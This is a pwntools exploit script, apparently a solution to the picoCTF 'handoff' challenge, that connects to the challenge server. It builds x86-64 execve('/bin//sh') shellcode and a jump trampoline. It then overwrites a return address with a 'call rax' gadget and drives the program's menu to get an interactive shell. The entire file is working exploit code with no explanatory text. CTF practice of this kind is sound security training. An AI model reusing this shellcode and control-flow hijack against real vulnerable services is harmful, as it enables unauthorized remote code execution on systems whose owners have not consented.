from pwn import *

context.binary = ('./handoff')
#context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./handoff')

p = remote('shape-facility.picoctf.net', 49851)
#p = process(elf.path)

#gdb_script = (f"""
#    b *0x4013e8
#""")
#gdb.attach(p, gdb_script)

shellcode = asm(
    """
    xor    rax, rax
    push   rax
    xor    rdx, rdx
    xor    rsi, rsi
    movabs rbx, 0x68732f2f6e69622f
    push   rbx
    push   rsp
    pop    rdi
    mov    al, 0x3b
    syscall
    """
)

jmp_to_shellcode = asm(
    """
    nop
    nop
    nop
    nop
    nop
    sub rax, 0x200
    sub rax, 0xcc
    jmp rax
    """
)

payload = jmp_to_shellcode.ljust(20, b"a")
payload += p64(next(elf.search(asm("call rax;"), executable=True)))

p.sendlineafter(b"app", b"1")
p.sendlineafter(b"name: ", b"a")

p.sendlineafter(b"app", b"2")
p.sendlineafter(b"to?", b"0")
p.sendlineafter(b"them?", shellcode)

p.sendlineafter(b"app", b"3")
p.sendlineafter(b"it: ", payload)
#pause()

p.interactive()
